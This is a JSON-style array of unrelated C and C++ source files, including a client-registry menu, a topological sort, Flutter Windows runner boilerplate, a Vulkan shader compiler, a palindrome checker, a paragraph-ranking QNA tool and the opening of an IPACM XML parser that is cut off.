    "\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n// Estrutura para armazenar os dados de um cliente\nstruct Cliente\n{\n\tchar nome[20]; // Nome do cliente (m\u00e1ximo 20 caracteres)\n\tchar email[20]; // Email do cliente (m\u00e1ximo 20 caracteres)\n};\n\nint main() {\n\n\t// Array para armazenar at\u00e9 20 clientes\n\tstruct Cliente clientes[20];\n\tint opcao, numClientes = 0;\n\n\t// Loop principal do programa, que se repete at\u00e9 a op\u00e7\u00e3o 5 ser selecionada\n\tdo {\n\t\tprintf(\"Selecione uma opcao: \\n\");\n\t\tprintf(\"1 - Adicionar cliente\\n\");\n\t\tprintf(\"2 - Visualizar cliente\\n\");\n\t\tprintf(\"3 - Editar cliente\\n\");\n\t\tprintf(\"4 - Excluir cliente\\n\");\n\t\tprintf(\"5 - Sair\\n\");\n\n\t\tscanf(\"%d\", &opcao);\n\n\t\tswitch (opcao)\n\t\t{\n\t\tcase 1: {\n\t\t\t// Verificando se h\u00e1 espa\u00e7o para mais um cliente\n\t\t\tif (numClientes < 20) {\n\t\t\t\t// Solicitando o nome do cliente\n\t\t\t\tprintf(\"Digite o nome do cliente:\\n\");\n\t\t\t\tscanf(\"%s\", clientes[numClientes].nome);\n\n\t\t\t\t// Solicitando o email do cliente\n\t\t\t\tprintf(\"Digite o email do cliente:\\n\");\n\t\t\t\tscanf(\"%s\", clientes[numClientes].email);\n\n\t\t\t\t// Incrementando o contador de clientes\n\t\t\t\tnumClientes++;\n\n\t\t\t\t// Mensagem de sucesso\n\t\t\t\tprintf(\"Cliente adicionado com sucesso.\\n\");\n\t\t\t}\n\t\t\telse {\n\t\t\t\t// Mensagem de erro caso o limite de clientes seja atingido\n\t\t\t\tprintf(\"Limite de clientes atingido. Imposs\u00edvel adicionar mais clientes.\\n\");\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\n\t\tcase 2: {\n\t\t\t// Verificando se h\u00e1 pelo menos um cliente cadastrado\n\t\t\tif (numClientes > 0) {\n\t\t\t\t// T\u00edtulo da lista de clientes\n\t\t\t\tprintf(\"Clientes cadastrados\\n\");\n\n\t\t\t\t// Imprimindo os dados de cada cliente cadastrado\n\t\t\t\tfor (int i = 0; i < numClientes; i++) {\n\t\t\t\t\tprintf(\"Nome: %s\\n\", clientes[i].nome);\n\t\t\t\t\tprintf(\"Email: %s\\n\", clientes[i].email);\n\t\t\t\t\tprintf(\"--------------------\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\t// Mensagem caso n\u00e3o haja clientes cadastrados\n\t\t\t\tprintf(\"Nenhum cliente cadastrado.\\n\");\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase 3: {\n\n\t\t\t// Vari\u00e1vel para armazenar o nome do cliente a ser editado\n\t\t\tchar nome[20];\n\t\t\tprintf(\"Digite o nome do cliente que deseja editar: \\n\");\n\t\t\tscanf(\"%s\", nome);\n\n\t\t\t// Buscando o cliente na lista\n\t\t\tfor (int i = 0; i < numClientes; i++)\n\t\t\t{\n\t\t\t\t// Comparando o nome digitado com o nome de cada cliente\n\t\t\t\tif (strcmp(clientes[i].nome, nome) == 0) {\n\t\t\t\t\tprintf(\"Digite o novo nome do cliente:\");\n\t\t\t\t\tscanf(\"%s\", clientes[i].nome);\n\n\t\t\t\t\tprintf(\"Digite o novo email do cliente:\");\n\t\t\t\t\tscanf(\"%s\", clientes[i].email);\n\n\t\t\t\t\tprintf(\"Cliente editado com sucesso\\n\");\n\t\t\t\t\tbreak; \n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase 4: {\n\t\t\tchar nome[20];\n\n\t\t\tprintf(\"Digite o nome cliente que deseja excluir:\");\n\t\t\tscanf(\"%s\", nome);\n\n\t\t\tfor (int i = 0; i < numClientes; i++)\n\t\t\t{\n\t\t\t\tif (strcmp(clientes[i].nome, nome) == 0) {\n\t\t\t\t\tfor (int j = i; j < numClientes - 1; j++)\n\t\t\t\t\t{\n\t\t\t\t\t\tclientes[j] = clientes[j + 1];\n\t\t\t\t\t}\n\n\t\t\t\t\tnumClientes--;\n\t\t\t\t\tprintf(\"Cliente excluido do cadastro\");\n\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tcase 5: {\n\t\t\tprintf(\"Encerrando o programa...\\n\");\n\t\t\tbreak;\n\t\t}\n\n\t\t}\n\t} while (opcao != 5);\n\n\treturn 0;\n}",
    "#include <stdio.h>\n#include <queue>\n#include <stack>\n#include <string>\n#include <iostream>\n#include <fstream>\n#include \"Graphe.h\" //custom graph class header \n\nusing namespace std;\n\nifstream fin(\"index.in.txt\"); //input file\nofstream fout(\"index.out.txt\"); //output file\n\nGraph<int, int> g(27); \nchar* visited;\nstack<int> s;//stack for topologic sort FILO\n\n// Depth-First Search (DFS) function\nvoid dfs(int x) {\n    int y;\n    //printf(\"%d\\n\", x);\n    cout << char(x + 'a' - 1) << \" \"; // Print the character corresponding to the node\n    visited[x] = 1; // Mark the node as visited\n\n    //traverse all the nodes\n    for (y = 0; y < g.N; y++)\n        if (g.A[x][y] && !visited[y])\n            dfs(y);\n}\n\n// Topologic Sort function\nvoid topologicSort(int x) { \n\n    // Recursively visit all adjacent nodes\n    for (int i = 0; i < g.N; i++)\n        if (g.A[x][i] && !visited[i])\n            topologicSort(i);\n\n    visited[x] = 1; // Mark the node as visited\n    s.push(x); // Push the node to the stack\n    cout << char(x + 'a' - 1) << \" \";\n\n}\n\n// Function to compare letters of two consecutive words and build the graph\nvoid compareLetters(int n, string v[]) {\n    for (int i = 0; i < n - 2; i++) {\n        int ok = 0;\n\n        cout << v[i] << \" \" << v[i].length() << endl;\n        cout << v[i + 1] << \" \" << v[i + 1].length() << endl;\n\n        // Compare characters of two words\n        if (v[i].length() >= v[i + 1].length()) {\n            for (int j = 0; j < v[i + 1].length(); j++) {\n\n                cout << v[i][j] << \" - \" << v[i + 1][j] << endl;\n                if (v[i][j] == v[i + 1][j])\n                    ok++;\n                if (ok == j && v[i][j] != v[i + 1][j]) {\n                    cout << v[i][j] << v[i + 1][j] << endl;\n                    g.addEdge(v[i][j] - 'a' + 1, v[i + 1][j] - 'a' + 1);\n                    ok = 0;\n                }\n            }\n        }\n        else if (v[i].length() < v[i + 1].length()) {\n            for (int j = 0; j < v[i].length(); j++) {\n\n                cout << v[i][j] << \" - \" << v[i + 1][j] << endl;\n                if (v[i][j] == v[i + 1][j])\n                    ok++;\n                if (ok == j && v[i][j] != v[i + 1][j]) {\n                    cout << v[i][j] << v[i + 1][j] << endl;\n                    g.addEdge(v[i][j] - 'a' + 1, v[i + 1][j] - 'a' + 1);\n                    ok = 0;\n                }\n            }\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n    string v[50]; // Array to store words from the input file\n    int n = 0; // Number of words\n\n    // Read words from the input file until \".\" is encountered\n    while (fin && v[n] != \".\")\n    {\n        fin >> v[n];\n        n++;\n    }\n\n    // Print all words read from the input file\n    for (int i = 0; i < n; i++)\n        cout << v[i] << endl;\n\n    char c = v[0][0]; // Obtain the first character of the first word\n    cout << \"First letter: \" << c << endl;\n\n    compareLetters(n, v); // Build the graph based on word comparisons\n\n    /*\n    visited = new char[g.N];\n    for (int i = 0; i < g.N; i++)\n        visited[i] = 0;\n\n    dfs(c - 'a' + 1);\n    cout << endl;\n    */\n\n   // Initialize the visited array for topological sort\n    visited = new char[g.N];\n    for (int i = 0; i < g.N; i++)\n        visited[i] = 0;\n\n    topologicSort(c - 'a' + 1); // Perform topological sort\n\n    // Output the sorted characters to the output file\n    while (!s.empty()) {\n        fout << char(s.top() + 'a' - 1);\n        s.pop();\n    }\n    fin.close();\n    fout.close();\n}\n\n\n\n/*\nSample input in index.in.txt:\n\nion\nana\nadonia\ndoina\ndoinn\nddan\nddao\n\nb\n\n\nxwy\nzx\nzxy\nzxw\nywwx\n*/",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sample\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"vksm.h\"\n#include \"shaderc/shaderc.hpp\"\n\nbool verbose;\n\nvoid vksmInterpretShaderFile(const char* location)\n{\n   std::string includeInAll;\n   std::string contents;\n   std::string vertex;\n   std::string fragment;\n   std::string name = \"hey\";\n   int vertLocation;\n   int fragLocation;\n   int vertEndLocation;\n   int fragEndLocation;\n\n   std::ifstream file(location);\n\n   std::stringstream s;\n   s << file.rdbuf();\n   contents = s.str();\n\n   if (!file.is_open())\n   {\n      printf(\"File Doesn't Exist\\n\");\n      exit(1);\n   }\n   \n   vertLocation = contents.find(VKSM_VERTEX_DEFINITION_TOKEN); \n   fragLocation = contents.find(VKSM_FRAGMENT_DEFINITION_TOKEN);\n   vertEndLocation = contents.find(VKSM_SHADER_END_TOKEN) - 18;\n   fragEndLocation = contents.find(VKSM_SHADER_END_TOKEN, vertEndLocation);\n   includeInAll = contents.substr(0, vertLocation);\n   vertex = includeInAll + \"\\n\" + contents.substr(vertLocation+VKSM_VERTEX_DEFINITION_TOKEN.size(), vertEndLocation); \n   fragment = includeInAll + \"\\n\" + contents.substr(fragLocation+VKSM_FRAGMENT_DEFINITION_TOKEN.size(), contents.size()-1);\n   \n   fragment.at(fragment.size()-1) = ' ';\n   if (verbose)\n   {\n      std::cout << \"## WHATS BEING INCLUDED IN BOTH SHADERS ##\\n\" << includeInAll << \"\\n\";\n      std::cout << \"## VERTEX ##\\n\" << vertex << \"\\n\";\n      std::cout << \"## FRAGMENT ##\\n\" << fragment << \"\\n\";\n   }\n   \n   vksmCompile(vertex, fragment, name);\n}\n\nvoid vksmCompile(std::string vert, std::string frag, std::string name)\n{\n   /*std::filesystem::create_directory(\"./temp\");\n   \n   std::ofstream vf(\"./temp/vert.vert\");\n   vf << vert;\n   std::ofstream ff(\"./temp/frag.frag\");\n   ff << frag;\n\n   std::string vertCommand = \"glslc -std=450core ./temp/vert.vert -o \" + name + std::string(\".vert.spv\");\n   system(vertCommand.data());\n\n   std::string fragCommand = std::string(\"glslc -std=450core ./temp/frag.frag -o \") + name + std::string(\".frag.spv\"); \n   \n   system(fragCommand.data());\n\n   std::system(\"rm ./temp -r\");\n   \n   if (verbose)\n   {\n      std::cout << \"\\n\" << (std::string(\"glslc ./temp/vert.vert -o \") + name + std::string(\".vert.spv\")).data() << \"\\n\";\n      std::cout << \"\\n\" << std::string(\"glslc ./temp/frag.frag -o \") + name + std::string(\".frag.spv\") << \"\\n\";\n   }*/\n   shaderc::Compiler compiler;\n   shaderc::CompileOptions options;\n\n   options.AddMacroDefinition(\"MADE_WITH_VULKAN_SHADER_MIXER_AND_LOVE\", \":heart:\");\n   shaderc::PreprocessedSourceCompilationResult result = compiler.PreprocessGlsl(vert, shaderc_glsl_vertex_shader, name.data(), options);\n   shaderc::PreprocessedSourceCompilationResult resultf = compiler.PreprocessGlsl(frag, shaderc_glsl_fragment_shader, name.data(), options);\n\n   if (result.GetCompilationStatus() != shaderc_compilation_status_success)\n      std::cerr << result.GetErrorMessage();\n \n   if (resultf.GetCompilationStatus() != shaderc_compilation_status_success)\n      std::cerr << resultf.GetErrorMessage();\n   options.SetOptimizationLevel(shaderc_optimization_level_size);\n\n   shaderc::SpvCompilationResult module = compiler.CompileGlslToSpv(vert, shaderc_glsl_vertex_shader, name.data(), options);\n   shaderc::SpvCompilationResult modulef = compiler.CompileGlslToSpv(frag, shaderc_glsl_fragment_shader, name.data(), options);\n  \n   if (module.GetCompilationStatus() != shaderc_compilation_status_success)\n      std::cerr << module.GetErrorMessage();\n   if (modulef.GetCompilationStatus() != shaderc_compilation_status_success)\n      std::cerr << modulef.GetErrorMessage();\n   \n   std::vector<uint32_t> m = {module.cbegin(), module.cend()}; \n   std::ofstream o(name+std::string(\"_vert.spv\"));\n   for (int i = 0; i < m.size(); ++i)\n   {\n      o << static_cast<unsigned char>(m[i] & 0x000000FF);\n   }\n\n   m = {modulef.cbegin(), modulef.cend()};\n   o = std::ofstream(name+std::string(\"_frag.spv\"));\n   for (int i = 0; i < m.size(); ++i)\n   {\n      o << static_cast<unsigned char>(m[i] & 0x000000FF);\n   }\n}\n\nint main(int argc, char* argv[])\n{\n   for (int i = 0; i < argc; i++)\n   {\n      if (strcmp(argv[i], \"-f\") == 0)\n      {\n         \n         printf(\"Opening File %s\\n\", argv[i+1]);\n         vksmInterpretShaderFile(argv[i+1]);\n      }\n      \n      if (strcmp(argv[i], \"-v\") == 0)\n      {\n         verbose = true;\n      }\n   }\n}\n",
    "#include <iostream>\n#include <algorithm>\nbool isPalindrome(std::string &str)\n{\n    for (int i = 0; i < (int)str.length(); ++i)\n    {\n        if (!(std::toupper(str[i]) >= 'A' && std::toupper(str[i]) <= 'Z'))\n        {\n            if (!(str[i] >= '0' && str[i] <= '9'))\n            {\n                str[i] = ' ';\n            }\n        }\n    }\n    str.erase(remove_if(str.begin(), str.end(), isspace), str.end());\n    int size = str.length();\n    int reverseCounter = size - 1;\n\n    for (int i = 0; i < size / 2; ++i)\n    {\n        // std::cout<< str[i] << ' '<< str[reverseCounter];\n        if (std::toupper(str[i]) != std::toupper(str[reverseCounter]))\n        {\n            return false;\n        }\n        --reverseCounter;\n    }\n    return true;\n}\n\nint main()\n{\n    std::string str = \"too, bad i ,hid a ,boot\";\n\n    if (isPalindrome(str))\n    {\n        std::cout << str << '\\n';\n        std::cout << \"The string is a palindrome\\n\";\n    }\n    else\n    {\n        std::cout << str << '\\n';\n        std::cout << \"The string is not a palindrome\\n\";\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pokedex_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"runner_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//#include<iostream>\n//#include<Windows.h>\n//#include<conio.h>\n//#include<fstream>\n//#include<sstream>\n//#include<vector>\n//#include<string>\n//#include<list>\n//using namespace std;\n//\n//struct Data {\n//\tdouble amount;\n//\tstring category;\n//\tstring description;\n//\tstring date;\n//\tstring designation;\n//};\n//\n//vector<Data>user;\n//string months[12] = { \"Jan\", \"Feb\", \"Mar\", \"Apr\",\n//\t\t\t\t\t\"May\", \"June\", \"July\", \"Aug\",\n//\t\t\t\t\t\"Sept\", \"Oct\", \"Nov\", \"Dec\" };\n//\n//// function to set color\n//void color(int color) {\n//\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\n//}\n//\n//void read(string filename, string dated);\n//void tokenize(string s, string del);\n//bool isInt(const string& str);\n//void splitDate(const string& date, int& year, int& month, int& day);\n//void splitDate(const string& date, int& year, int& month);\n//\n//// function to go to a location on the console\n//void gotoxy(int x, int y) {\n//\tCOORD c;\n//\tc.X = x;\n//\tc.Y = y;\n//\tSetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), c);\n//}\n//\n//\n//int main() {\n//\tint choice;\n//\tstring date;\n//\tcout << \"1. Generate monthly report: \\n\";\n//\tcout << \"Select your choice to continue: \";\n//\tcin >> choice;\n//\tif (choice == 1) {\n//\t\tread(\"mahnoor.txt\", \"2024-05\");\n//\t}\n//\telse {\n//\t\tcout << \"Incorrect Option, closing the program!!\";\n//\t}\n//\treturn 0;\n//}\n//\n//\n//void read(string filename, string dated) {\n//\tint year1, month1;\n//\tsplitDate(dated, year1, month1);\n//\tint monthno = stoi(dated.substr(6, 1));\n//    ifstream file;\n//\tstring categories[7];\n//\tint amount[7];\n//\tint limit =0;\n//    file.open(filename);\n//    // Make sure the file opened properly\n//    string buffer;\n//    char c;\n//    while (getline(file, buffer)) {\n//        bool found = false;\n//\t\ttokenize(buffer, \" \");\n//    }\n//\tfor (auto it = user.begin(); it != user.end(); ++it) {\n//\t\tstring et;\n//\t\tint year, month, day;\n//\t\tet = it->date;\n//\t\tsplitDate(et, year, month, day);\n//\t\tif (year == year1 && month == month1) {\n//\t\t\tif (limit > 0) {\n//\t\t\t\tbool exists = false;\n//\t\t\t\tfor (int k = 0; k < limit; k++) {\n//\t\t\t\t\tif (categories[k] == it->category) {\n//\t\t\t\t\t\tamount[k] = amount[k] + it->amount;\n//\t\t\t\t\t\tcout << \"\\n\" << it->amount << endl << limit << endl << it->category << \"match\"<< endl;\n//\t\t\t\t\t\texists = true;\n//\t\t\t\t\t}\n//\t\t\t\t\t\n//\t\t\t\t}\n//\t\t\t\tif(!exists){\n//\t\t\t\tcategories[limit] = it->category;\n//\t\t\t\tamount[limit] = it->amount;\n//\t\t\t\tcout << \"\\n\" << it->amount << endl << limit << endl << it->category << endl;\n//\t\t\t\tlimit++;\n//\t\t\t\t}\n//\t\t\t}\n//\t\t\telse {\n//\t\t\tcategories[limit] = it->category;\n//\t\t\tamount[limit] = it->amount;\n//\t\t\tlimit++;\n//\t\t\t}\n//\t\t}\n//\t}\n//\tif (limit > 0) {\n//\t\tcout << \"\\tExpenses for the Month: \" << months[monthno -1] << endl;\n//\t\tfor (int j = 0; j < limit; j++) {\n//\t\t\tcout << \"\\t \" << categories[j] << \": \";\n//\t\t\tstring bar(amount[j] / 100, '#'); // Replace '' with '#'\n//\t\t\tcout << bar << \" $\" << amount[j] << endl;\n//\t\t}\n//\t}\n//    file.close();\n//}\n//\n//bool isInt(const string& str) {\n//\tint n;\n//\tistringstream istreamObject(str); // Create istringstream from string\n//\tistreamObject >> noskipws >> n; // Get an int value from stream\n//\t// Check if stringstream has reached its end and not failed\n//\treturn istreamObject.eof() && !istreamObject.fail();\n//}\n//\n//void tokenize(string s, string del)\n//{\n//\tData data;\n//\tint start, end = -1 * del.size();\n//\tint i = 0;\n//\tdo {\n//\t\tstart = end + del.size();\n//\t\tend = s.find(del, start);\n//\t\tswitch (i)\n//\t\t{\n//\t\t\t\n//\t\tcase 0:\n//\t\t\tdata.category = s.substr(start, end - start);\n//\t\t\ti++;\n//\t\t\tbreak;\n//\t\tcase 1:\n//\t\t\tdata.description = s.substr(start, end - start) ;\n//\t\t\ti++;\n//\t\t\tbreak;\n//\t\tcase 2:\n//\t\t\tdata.amount = stoi( s.substr(start, end - start));\n//\t\t\ti++;\n//\t\t\tbreak;\n//\t\tcase 3: \n//\t\t\tdata.date =s.substr(start, end - start);\n//\t\t\ti++;\n//\t\t\tbreak;\n//\t\tcase 4:\n//\t\t\tdata.designation = s.substr(start, end - start);\n//\t\t\ti++;\n//\t\t\tbreak;\n//\t\tdefault:\n//\t\t\tbreak;\n//\t\t}\n//\n//\t\t\t\n//\t} while (end != -1);\n//\tuser.push_back(data);\n//\t/*for (int k = 0; k < j; k++) {\n//\t\tcout << k + 1 << \". \" << categories[k] << \" \" << amount[k] <<endl;\n//\t}*/\n//}\n//\n//void splitDate(const string& date, int& year, int& month, int& day) {\n//\tyear = stoi(date.substr(0, 4));\n//\tmonth = stoi(date.substr(5, 2));\n//\tday = stoi(date.substr(8, 2));\n//}\n//void splitDate(const string& date, int& year, int& month) {\n//\tyear = stoi(date.substr(0, 4));\n//\tmonth = stoi(date.substr(5, 2));\n//}\n//\n//\n////You can't use an initialization-list for a struct after it's been initialized.You've already default-initialized the two Customer structs when you declared the array customerRecords. Therefore you're going to have either use member - access syntax to set the value of the non - static data members, initialize the structs using a list of initialization lists when you declare the array itself, or you can create a constructor for your struct and use the default operator= member function to initialize the array members.\n////\n////So either of the following could work :\n////\n////C",
    "#include <assert.h>\n#include <sstream>\n#include \"qna_tool.h\"\n\nusing namespace std;\n\n\nsize_t find(vector<string>& v, string& s) {\n    for (size_t i = 0;i < v.size();i++) {\n        if (v[i] == s) return i;\n    }\n    return -1;\n}\n\nQNA_tool::QNA_tool(){\n    // Implement your function here \n\n    ifstream word_counter(\"unigram_freq.csv\");\n    string file_content;\n    getline(word_counter, file_content);\n    while (getline(word_counter, file_content)) {\n        stringstream line_info(file_content);\n        string to_insert;\n        string ct;\n        getline(line_info, to_insert, ',');\n        getline(line_info, ct, ' ');\n        word_freq.insert_word(to_insert, stoll(ct));\n    }\n    word_counter.close();\n}\n\nQNA_tool::~QNA_tool(){\n    // Implement your function here \n\n}\n\nvoid QNA_tool::insert_sentence(int book_code, int page, int paragraph, int sentence_no, string sentence){\n    // Implement your function here  \n    word_counts.insert_sentence(book_code, page, paragraph, sentence_no, sentence);\n    paras.add(book_code, page, paragraph, 0);\n    // alt method\n    // searcher.insert_sentence(book_code, page, paragraph, sentence_no, sentence);\n    return;\n}\n\nNode* QNA_tool::get_top_k_para(string question, int k) {\n    // Implement your function here\n    for (int i = 0;i < paras.capacity;i++) {\n        Para* itr = (*paras.storage)[i];\n        while (itr) {\n            itr->ct = 0;\n            itr = itr->next;\n        }\n        \n    }\n\n    question.push_back('.');\n    string word = \"\";\n    vector<string> words;\n    Table content;\n    for (char& c: question) {\n        if (Info::ascii[(int)c] < 0) {\n            if (word.length() > 0) {\n                // if (find(words, word) == -1) \n                words.emplace_back(word);\n            }\n            word = \"\";\n        } else \n            word.push_back(Info::value[Info::ascii[(int)c]]);\n    }\n\n    vector<Para*> heap;\n\n    // Para _1 = Para(1, 0, 7);\n    // Para _2 = Para(1, 1, 0);\n    // Para _3 = Para(1, 1, 4);\n    // Para _4 = Para(1, 3, 0);\n    // Para _5 = Para(1, 5, 0);\n    // vector<Para> test = {_1, _2, _3, _4, _5};\n\n    for (string& w: words) {\n        long double score = ((double)word_counts.get_word_count(w) + 1)/((double)word_freq.get_word_count(w) + 1);\n        // increment score of each word using distrib of w in trie\n        Table* distrib = word_counts.getDistrib(w);\n        // cout << distrib << \"\\n\";\n        // cout << w << \" \" << distrib->size << \"\\n\";\n        // for (Para p: test) {\n        //     cout << \"(\" << p.book_code << \", \" << p.page_no << \", \" << p.para << \") \" << distrib->get(p.book_code, p.page_no, p.para) << \"\\n\";\n        // }\n        if (!distrib) continue;\n        for (int i = 0;i < distrib->capacity;i++) {\n            Para* results = (*distrib->storage)[i];\n            while (results) {\n                bool pushIt = !paras.get(results->book_code, results->page_no, results->para);\n                Para* tmp = paras.add(results->book_code, results->page_no, results->para, results->ct * score);\n                if (pushIt) heap.push_back(tmp);\n                results = results->next;\n            }\n        }\n\n        // alt method\n        // string tS = \" \" + w + \" \";\n        // int ct = 0;\n        // Node* results = searcher.search(tS, ct);\n        // cout << w << \" \" << score << \" \" << ct << \"\\n\";\n        // while (results) {\n        //     bool pushIt = !paras.get(results->book_code, results->page, results->paragraph);\n        //     Para* tmp = paras.add(results->book_code, results->page, results->paragraph, score);\n        //     // cout << tmp << \" \" << results->book_code << \" \" << results->page << \" \" << results->paragraph << \" \" << paras.get(results->book_code, results->page, results->paragraph) << \" \" << pushIt << \"\\n\";\n        //     if (pushIt) heap.push_back(tmp);\n        //     results = results->right;\n        // }\n    }\n\n    // pad with score 0 paragraphs\n    int n = heap.size();\n    if (n < k) {\n        for (int i = 0;i < paras.capacity;i++) {\n            Para* itr = (*paras.storage)[i];\n            while (itr) {\n                if (n >= k || n == paras.size) break;\n                if (itr->ct == 0) {\n                    n++;\n                    heap.push_back(itr);\n                }\n                itr = itr->next;\n            }\n        }\n    }\n\n    if (n < k) k = paras.size;\n    // use min heap for topK\n    topK myRank = topK(heap, k);\n\n    return myRank.getTopK();\n}\n\nvoid QNA_tool::query(string question, string filename){\n    // Implement your function here  \n    std::cout << \"Q: \" << question << std::endl;\n    std::cout << \"A: \" << \"Studying COL106 :)\" << std::endl;\n    return;\n}\n\nstd::string QNA_tool::get_paragraph(int book_code, int page, int paragraph){\n\n    cout << \"Book_code: \" << book_code << \" Page: \" << page << \" Paragraph: \" << paragraph << endl;\n    \n    std::string filename = \"mahatma-gandhi-collected-works-volume-\";\n    filename += to_string(book_code);\n    filename += \".txt\";\n\n    std::ifstream inputFile(filena",
    "/*\nCopyright (c) 2013, The Linux Foundation. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n * Redistributions of source code must retain the above copyright\n   notice, this list of conditions and the following disclaimer.\n * Redistributions in binary form must reproduce the above\n   copyright notice, this list of conditions and the following\n   disclaimer in the documentation and/or other materials provided\n   with the distribution.\n * Neither the name of The Linux Foundation nor the names of its\n   contributors may be used to endorse or promote products derived\n   from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\nWARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\nARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\nBE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\nBUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\nWHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\nOR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\nIF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n/*!\n  @file\n   IPACM_Xml.cpp\n\n  @brief\n   This file implements the XML specific parsing functionality.\n\n  @Author\n   Skylar Chang/Shihuan Liu\n*/\n\n#include <sys/socket.h>\n#include <netinet/in.h>\n#ifndef in_addr_t\ntypedef uint32_t in_addr_t;\n#endif\n#include <arpa/inet.h>\n\n#include \"IPACM_Xml.h\"\n#include \"IPACM_Log.h\"\n#include \"IPACM_Netlink.h\"\n\nstatic char* IPACM_read_content_element\n(\n\t xmlNode* element\n);\n\nstatic int32_t IPACM_util_icmp_string\n(\n\t const char* xml_str,\n\t const char* str\n);\n\nstatic int ipacm_cfg_xml_parse_tree\n(\n\t xmlNode* xml_node,\n\t IPACM_conf_t *config\n);\n\nstatic int IPACM_firewall_xml_parse_tree\n(\n\t xmlNode* xml_node,\n\t IPACM_firewall_conf_t *config\n);\n\n/*Reads content (stored as child) of the element */\nstatic char* 